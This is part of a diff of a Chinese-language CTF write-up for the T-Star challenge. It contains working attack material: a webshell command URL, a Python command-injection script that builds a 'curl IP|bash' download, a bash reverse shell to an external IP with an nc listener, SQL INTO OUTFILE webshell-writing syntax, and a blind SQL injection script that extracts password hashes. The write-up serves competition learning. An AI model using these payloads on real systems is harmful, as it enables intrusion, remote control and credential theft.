-<p><a href="http://31a9f418.yunyansec.com/2017126151.jsp?pwd=fff&amp;cmd=cat%20flag.txt" target="_blank" rel="noopener">http://31a9f418.yunyansec.com/2017126151.jsp?pwd=fff&amp;cmd=cat%20flag.txt</a></p>
-<p><img src="image-20200703145708208.png" alt="image-20200703145708208"></p>
-<h3 id="flag值：-6"><a href="#flag值：-6" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{54e47be053bf6ea1}</p>
-<h2 id="8-题目八-分析代码获得flag"><a href="#8-题目八-分析代码获得flag" class="headerlink" title="8.题目八 分析代码获得flag"></a>8.题目八 分析代码获得flag</h2><h3 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h3><p>运行脚本文件，写入payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"></span><br><span class="line">payload &#x3D; [</span><br><span class="line">    &#39;&gt;ls\\&#39;, </span><br><span class="line">    &#39;ls&gt;_&#39;, </span><br><span class="line">    &#39;&gt;\ \\&#39;, </span><br><span class="line">    &#39;&gt;-t\\&#39;, </span><br><span class="line">    &#39;&gt;\&gt;g&#39;, </span><br><span class="line">    &#39;ls&gt;&gt;_&#39;, </span><br><span class="line"></span><br><span class="line">    &#39;&gt;sh&#39;, </span><br><span class="line">    &#39;&gt;ba\\&#39;, </span><br><span class="line">    &#39;&gt;\|\\&#39;,</span><br><span class="line">    &#39;&gt;32\\&#39;,</span><br><span class="line">    &#39;&gt;1.\\&#39;,</span><br><span class="line">    &#39;&gt;5\\&#39;, </span><br><span class="line">    &#39;&gt;2.\\&#39;,</span><br><span class="line">    &#39;&gt;10\\&#39;, </span><br><span class="line">    &#39;&gt;9.\\&#39;, </span><br><span class="line">    &#39;&gt;3\\&#39;, </span><br><span class="line">    &#39;&gt;\ \\&#39;, </span><br><span class="line">    &#39;&gt;rl\\&#39;, </span><br><span class="line">    &#39;&gt;cu\\&#39;, </span><br><span class="line"></span><br><span class="line">    # exec</span><br><span class="line">    &#39;sh _&#39;, </span><br><span class="line">    &#39;sh g&#39;, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;82da9c13.yunyansec.com&#x2F;?reset&#x3D;1&#39;)</span><br><span class="line">for i in payload:</span><br><span class="line">    assert len(i) &lt;&#x3D; 5 </span><br><span class="line">    r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;82da9c13.yunyansec.com&#x2F;?1&#x3D;&#39; + quote(i) )</span><br><span class="line">    print(i)</span><br><span class="line">    sleep(0.2)</span><br></pre></td></tr></table></figure>
-
-<p>服务器配置，在index.php中写入脚本<br>bash -i &gt;&amp; /dev/tcp/39.105.51.32/8080 0&gt;&amp;1<br>nc监听，运行脚本，反弹shell<br>nc -lvvp 8080<br>终端中查看文件内容得到flag<br>flag{a1c8BFF2}</p>
-<p>之后看第一名战队的wp，还可以用cat读取上级目录中的文件内容来获取flag</p>
-<p><img src="image-20200703151818734.png" alt="image-20200703151818734"></p>
-<h3 id="flag值：-7"><a href="#flag值：-7" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{a1c8BFF2}</p>
-<h2 id="9-SQL注入1"><a href="#9-SQL注入1" class="headerlink" title="9.SQL注入1"></a>9.SQL注入1</h2><p>群里大佬提出是limit注入写文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INTO OUTFILE &#39;物理路径&#39; lines terminated by  （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; fields terminated by （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; columns terminated by （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; lines starting by    （一句话hex编码）</span><br></pre></td></tr></table></figure>
-
-<p>前提：开启secure-file-priv以及有写的权限就可以进行limit写shell</p>
-<h2 id="10-SQL注入2"><a href="#10-SQL注入2" class="headerlink" title="10.SQL注入2"></a>10.SQL注入2</h2><p>御剑扫wwwroot.zip，过滤方法中看到过滤的比较凶。赛后通过第一名战队的wp来看，应该是异或注入。猜测账号密码图片都在同一个数据库表中。通过poc猜解出password的hash。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">a &#x3D;[&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]</span><br><span class="line">temp &#x3D; &#39;&#39;</span><br><span class="line">while(1):</span><br><span class="line">    for i in a:</span><br><span class="line">        url &#x3D; &#39;http:&#x2F;&#x2F;23dcf1dc.yunyansec.com&#x2F;picture.php?id&#x3D;3&quot; or password REGEXP &#39;+&#39;\&#39;^&#39;+temp+i+&#39;\&#39; %23&#39;</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        if &#39;not found&#39; not in r.text:</span><br><span class="line">            temp &#x3D; temp+i</span><br><span class="line">            print (temp)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-
-<p><img src="image-20200703152040620.png" alt="image-20200703152040620"></p>
+<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703152040620.png" alt="image-20200703152040620"></p>
 <p>二十位的hash，可能为dedecms，然后去掉前三位跟后一位然后md5解密得到密码，登录拿到flag。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">详细sql1解法，第一名战队的wp：https:&#x2F;&#x2F;0xfire.me&#x2F;2020&#x2F;06&#x2F;30&#x2F;T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B&#x2F;</span><br><span class="line">github中也有SQL1的解题方法：https:&#x2F;&#x2F;github.com&#x2F;XDSEC&#x2F;xdsec_ctf&#x2F;tree&#x2F;494b53d388186e8be21e753bb2048362842280c1&#x2F;xdctf2015&#x2F;izyCTF</span><br></pre></td></tr></table></figure>
 
